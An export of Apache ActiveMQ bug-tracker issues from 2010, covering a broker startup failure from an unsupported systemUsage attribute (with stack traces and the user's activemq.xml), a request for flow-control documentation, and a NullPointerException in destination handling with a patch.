    JVM args: -Xjcl:jclscar_24 -Dcom.ibm.oti.vm.bootstrap.library.path=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64/default:/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64 -Dsun.boot.library.path=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64/default:/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64 -Djava.library.path=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64/default:/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64:/usr/lib -Djava.home=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre -Djava.ext.dirs=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/ext -Duser.dir=/srv/activemq/conf _j2se_j9=1119744 -Xdump -Djava.class.path=. -Xms128M -Xmx1024M -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dcom.sun.management.jmxremote.port=11099 -Dcom.sun.management.jmxremote.password.file=/srv/activemq/conf/jmx.password -Dcom.sun.management.jmxremote.access.file=/srv/activemq/conf/jmx.access -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=10.130.18.244 -Dcom.sun.management.jmxremote -Dcom.sun.management.snmp.port=30000 -Dcom.sun.management.snmp.interface=0.0.0.0 -Dcom.sun.management.snmp.acl.file=/srv/activemq/conf/snmp.acl -Dactivemq.classpath=/srv/activemq/conf/; -Dactivemq.home=/srv/activemq/install/apache-activemq -Dactivemq.base=/srv/activemq/install/apache-activemq -Djava.class.path=/srv/activemq/install/apache-activemq/bin/run.jar -Dsun.java.command=/srv/activemq/install/apache-activemq/bin/run.jar start -Dsun.java.launcher=SUN_STANDARD -Dsun.java.launcher.pid=25854 _port_library _org.apache.harmony.vmi.portlib  
ACTIVEMQ_HOME: /srv/activemq/install/apache-activemq                                                                                                                                                                                  
ACTIVEMQ_BASE: /srv/activemq/install/apache-activemq                                                                                                                                                                                  
Loading message broker from: xbean:activemq.xml                                                                                                                                                                                       
ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/srv/activemq/conf/activemq.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.usage.SystemUsage] while setting bean property 'systemUsage'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?                                                                                                                                                                                                              
java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/srv/activemq/conf/activemq.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.usage.SystemUsage] while setting bean property 'systemUsage'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?                                                                                                                                                                                                                     
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:98)                                                                                                                                             
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)                                                                                                                                       
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:129)                                                                                                                                            
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)                                                                                                                                       
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:79)                                                                                                                                                
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)                                                                                                                                                                
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:45)                                                                                                                                              
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:37)                                                                                                                                      
        at java.lang.reflect.Method.invoke(Method.java:599)                                                                                                                                                                           
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)                                                                                                                                                               
        at org.apache.activemq.console.Main.main(Main.java:107)                                                                                                                                                                       
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/srv/activemq/conf/activemq.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.usage.SystemUsage] while setting bean property 'systemUsage'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?                                      
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:230)                                                                                               
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:122)                                                                                        
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1245)                                                                             
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)                                                                                    
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)                                                                                     
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)                                                                                            
        at java.security.AccessController.doPrivileged(AccessController.java:224)                                                                                                                                                     
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)                                                                                       
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)                                                                                                                    
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)                                                                                                 
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)                                                                                                                      
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)                                                                                                                        
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)                                                                                                                        
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)                                                                                         
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)                                                                                        
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)                                                                                                                
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)                                                                                                                
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)                                                                                                                
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)                                                                                                                          
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)                                                                                                                                      
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)                                                                                                                                               
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)                                                                                                                                               
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)                                                                                                                                        
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)                                                                                                                                             
        ... 10 more                                                                                                                                                                                                                   
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?                                                                                                                                                  
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1279)                                                                             
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)                                                                                    
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)                                                                                     
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)                                                                                            
        at java.security.AccessController.doPrivileged(AccessController.java:224)                                                                                                                                                     
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)                                                                                       
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:219)                                                                                               
        ... 33 more                                                                                                                                                                                                                   
Caused by: org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?                                                                                                                        
        at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:801)                                                                                                                                       
        at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:651)                                                                                                                                       
        at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:78)                                                                                                                     
        at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:59)                                                                                                                     
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1276)
        ... 39 more
ERROR: java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/srv/activemq/conf/activemq.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.usage.SystemUsage] while setting bean property 'systemUsage'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/srv/activemq/conf/activemq.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.usage.SystemUsage] while setting bean property 'systemUsage'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:99)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:129)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:79)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:45)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:37)
        at java.lang.reflect.Method.invoke(Method.java:599)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/srv/activemq/conf/activemq.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.usage.SystemUsage] while setting bean property 'systemUsage'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:230)
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:122)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1245)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(AccessController.java:224)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)
        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
        ... 10 more
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1279)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(AccessController.java:224)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:219)
        ... 33 more
Caused by: org.springframework.beans.NotWritablePropertyException: Invalid property 'sendFailIfNoSpaceAfterTimeout' of bean class [org.apache.activemq.usage.SystemUsage]: Bean property 'sendFailIfNoSpaceAfterTimeout' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
        at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:801)
        at org.springframework.beans.BeanWrapperImpl.setPropertyValue(BeanWrapperImpl.java:651)
        at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:78)
        at org.springframework.beans.AbstractPropertyAccessor.setPropertyValues(AbstractPropertyAccessor.java:59)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1276)
        ... 39 more
---

My activemq.xml:
---                                                                
<!--                                                                                      
    Licensed to the Apache Software Foundation (ASF) under one or more                    
    contributor license agreements.  See the NOTICE file distributed with                 
    this work for additional information regarding copyright ownership.                   
    The ASF licenses this file to You under the Apache License, Version 2.0               
    (the ""License""); you may not use this file except in compliance with                  
    the License.  You may obtain a copy of the License at                                 
                                                                                          
    http://www.apache.org/licenses/LICENSE-2.0                                            
                                                                                          
    Unless required by applicable law or agreed to in writing, software                   
    distributed under the License is distributed on an ""AS IS"" BASIS,                     
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.              
    See the License for the specific language governing permissions and                   
    limitations under the License.                                                        
-->                                                                                       
<beans                                                                                    
  xmlns=""http://www.springframework.org/schema/beans""                                     
  xmlns:amq=""http://activemq.apache.org/schema/core""                                      
  xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""                                   
  xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
  http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd"">                               

    <!-- Allows us to use system properties as variables in this configuration file -->
    <bean class=""org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"">
        <property name=""locations"">                                                      
            <value>file:${activemq.base}/conf/credentials.properties</value>             
        </property>                                                                      
    </bean>                                                                              

    <!-- 
        The <broker> element is used to configure the ActiveMQ broker. 
    -->                                                                
    <broker xmlns=""http://activemq.apache.org/schema/core"" brokerName=""localhost"" dataDirectory=""${activemq.base}/data"" >
                                                                                                                         
<!--                                                                                                                     
         <systemUsage>                                                                                                   
           <systemUsage sendFailIfNoSpaceAfterTimeout=""3000"">                                                            
             <memoryUsage>                                                                                               
               <memoryUsage limit=""700 mb""/>                                                                             
             </memoryUsage>                                                                                              
             <storeUsage>                                                                                                
               <storeUsage limit=""1 gb"" name=""foo""/>                                                                     
             </storeUsage>                                                                                               
             <tempUsage>                                                                                                 
               <tempUsage limit=""1 gb""/>                                                                                 
             </tempUsage>                                                                                                
           </systemUsage>                                                                                                
         </systemUsage>                                                                                                  
-->                                                                                                                      

<systemUsage>
 <systemUsage sendFailIfNoSpaceAfterTimeout=""3000""> 
   <memoryUsage>                                    
     <memoryUsage limit=""20 mb""/>                   
   </memoryUsage>                                   
 </systemUsage>                                     
</systemUsage>                                      

        <!-- 
            The managementContext is used to configure how ActiveMQ is exposed in 
            JMX. By default, ActiveMQ uses the MBean server that is started by    
            the JVM. For more information, see:                                   
                                                                                  
            http://activemq.apache.org/jmx.html                                   
        -->                                                                       
        <managementContext>                                                       
            <managementContext createConnector=""false""/>                          
        </managementContext>                                                      

        <!-- 
            Configure message persistence for the broker. The default persistence
            mechanism is the KahaDB store (identified by the kahaDB tag).        
            For more information, see:                                           
                                                                                 
            http://activemq.apache.org/persistence.html                          
        -->                                                                      
        <persistenceAdapter>                                                     
            <kahaDB directory=""${activemq.base}/data/kahadb""/>                   
        </persistenceAdapter>                                                    
                                                                                 
                                                                                 
        <!--                                                                     
                        For better performances use VM cursor and small memory limit.
                        For more information, see:                                   
                                                                                     
            http://activemq.apache.org/message-cursors.html                          
                                                                                     
            Also, if your producer is ""hanging"", it's probably due to producer flow control.
            For more information, see:                                                      
            http://activemq.apache.org/producer-flow-control.html                           
        -->                                                                                 
                                                                                            
        <destinationPolicy>                                                                 
            <policyMap>                                                                     
              <policyEntries>                                                               


                <policyEntry topic="">"" producerFlowControl=""false"" memoryLimit=""1mb"">

                  <deadLetterStrategy>
                    <!--              
                      Use the prefix 'DLQ.' for the destination name, and make
                      the DLQ a queue rather than a topic                     
                    -->                                                       
                    <individualDeadLetterStrategy                             
                      queuePrefix=""DLQ."" useQueueForQueueMessages=""true"" />   
                  </deadLetterStrategy>

                  <pendingSubscriberPolicy>
                    <vmCursor />
                  </pendingSubscriberPolicy>
                </policyEntry>
                <policyEntry queue="">"" producerFlowControl=""false"" memoryLimit=""1mb"">
                  <!-- Use VM cursor for better latency
                       For more information, see:

                       http://activemq.apache.org/message-cursors.html

                  <pendingQueuePolicy>
                    <vmQueueCursor/>
                  </pendingQueuePolicy>
                  -->
                </policyEntry>
              </policyEntries>
            </policyMap>
        </destinationPolicy>

         <!--
            The systemUsage controls the maximum amount of space the broker will
            use before slowing down producers. For more information, see:

            nfigur
            http://activemq.apache.org/producer-flow-control.html

        <systemUsage>
            <systemUsage>
                <memoryUsage>
                    <memoryUsage limit=""20 mb""/>
                </memoryUsage>
                <storeUsage>
                    <storeUsage limit=""1 gb"" name=""foo""/>
                </storeUsage>
                <tempUsage>
                    <tempUsage limit=""100 mb""/>
                </tempUsage>
            </systemUsage>
        </systemUsage>
                -->

        <!--
            The transport connectors expose ActiveMQ over a given protocol to
            clients and other brokers. For more information, see:

            http://activemq.apache.org/configuring-transports.html
        -->
        <transportConnectors>
            <transportConnector name=""openwire"" uri=""tcp://0.0.0.0:61616""/>
        </transportConnectors>

    </broker>

    <!--
        Uncomment to enable Camel
        Take a look at activemq-camel.xml for more details

    <import resource=""camel.xml""/>
    -->

    <!--
        Enable web consoles, REST and Ajax APIs and demos
        Take a look at activemq-jetty.xml for more details
    -->
    <import resource=""jetty.xml""/>

</beans>
---
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74863,,,Tue Mar 02 17:21:55 UTC 2010,,,,,,,,,,,"0|i0ts9r:",171889,,,,,,,,,,,,,,,,,,,,,"02/Mar/10 15:50;gtully;5.3.1 has not been released yet. Try a https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/5.3.1-SNAPSHOT/;;;","02/Mar/10 17:21;gtully;that attribute is only in the 5.3.1 schema, so it can't validate with 5.3.0;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Missing documentation: http://activemq.apache.org/producer-flow-control.html,AMQ-2633,12483692,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,scoopex,scoopex,02/Mar/10 14:11,25/Feb/11 23:47,14/Jul/23 05:43,25/Feb/11 23:47,5.3.0,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"
According to http://activemq.apache.org/producer-flow-control.html resource usage can be limited 
in ActiveMQ by using the follwing configuration options:
-----
<systemUsage>
       <systemUsage sendFailIfNoSpaceAfterTimeout=""3000"">
         <memoryUsage>
           <memoryUsage limit=""700 mb""/>
         </memoryUsage>
         <storeUsage>
           <storeUsage limit=""1 gb"" name=""foo""/>
         </storeUsage>
         <tempUsage>
           <tempUsage limit=""1 gb""/>
         </tempUsage>
       </systemUsage>
</systemUsage>
-----

Can you add documentation about:
- what is limited in detail
- what is ""name"" needed for
- what the producer/consumer sees it the limits are reached
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,46498,,,Fri Feb 25 23:47:04 UTC 2011,,,,,,,,,,,"0|i0akk7:",59604,,,,,,,,,,,,,,,,,,,,,"25/Feb/11 23:47;tabish;The flow control documentation has been updated considerably since this was opened. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException in ActiveMQDestination (with patch),AMQ-2630,12483186,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,jschmied,jschmied,26/Feb/10 19:21,03/Mar/10 10:46,14/Jul/23 05:43,03/Mar/10 10:16,5.3.0,,,,,5.3.1,5.4.0,,Broker,,,,0,,,,,,,,,"The Oracle AQjmsDestination Object implements all the interfaces:

AQjmsDestination
 <-Queue<-Destination
 <-TemporaryQueue<-Queue<-Destination
 <-TemporaryTopicTopic<-Destination
 <-Topic<-Destination

The function ActiveMQDestination.transform fails to indicate the type of the Destination Object right, because it implements all Interfaces.

When the Object its a Topic in reality, the

        if (dest instanceof TemporaryQueue) {
            return new ActiveMQTempQueue(((TemporaryQueue)dest).getQueueName());
        }

thinks its a TemporaryQueue.

This causes the following stacktrace:
java.lang.NullPointerException
	at org.apache.activemq.command.ActiveMQDestination.setPhysicalName(ActiveMQDestination.java:208)
	at org.apache.activemq.command.ActiveMQTempDestination.setPhysicalName(ActiveMQTempDestination.java:63)
	at org.apache.activemq.command.ActiveMQDestination.<init>(ActiveMQDestination.java:77)
	at org.apache.activemq.command.ActiveMQTempDestination.<init>(ActiveMQTempDestination.java:39)
	at org.apache.activemq.command.ActiveMQTempQueue.<init>(ActiveMQTempQueue.java:35)
	at org.apache.activemq.command.ActiveMQDestination.transform(ActiveMQDestination.java:121)
	at org.apache.activemq.command.ActiveMQMessage.setJMSDestination(ActiveMQMessage.java:222)
	at org.apache.activemq.network.jms.TopicBridge.sendMessage(TopicBridge.java:91)
	at org.apache.activemq.network.jms.DestinationBridge.onMessage(DestinationBridge.java:146)
	at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1088)
	at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:127)
	at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:197)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)


 
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Feb/10 19:21;jschmied;Destination.patch;https://issues.apache.org/jira/secure/attachment/12461630/Destination.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74864,,,Wed Mar 03 10:46:41 UTC 2010,,,,,,,Patch Available,,,,"0|i0rqkn:",159949,,,,,,,,,,,,,,,,,,,,,"03/Mar/10 10:16;gtully;variant of patch added with test in r918381 thanks. Can you validate against your use case to ensure it still does what you want?;;;","03/Mar/10 10:46;gtully;applied to 5.3.1 branch;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
